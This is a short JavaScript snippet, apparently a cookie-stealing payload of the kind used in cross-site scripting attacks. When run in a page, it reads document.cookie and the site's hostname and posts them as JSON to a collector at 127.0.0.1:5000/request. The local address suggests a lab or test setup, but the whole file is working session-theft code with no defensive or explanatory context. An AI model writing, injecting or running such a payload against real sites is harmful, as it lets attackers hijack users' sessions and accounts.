(function () {
    let a = {
        cookie: document.cookie,
        host : window.location.hostname
    }

    let xhr = new XMLHttpRequest;
    xhr.open("post", "http://127.0.0.1:5000/request");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(a))
})()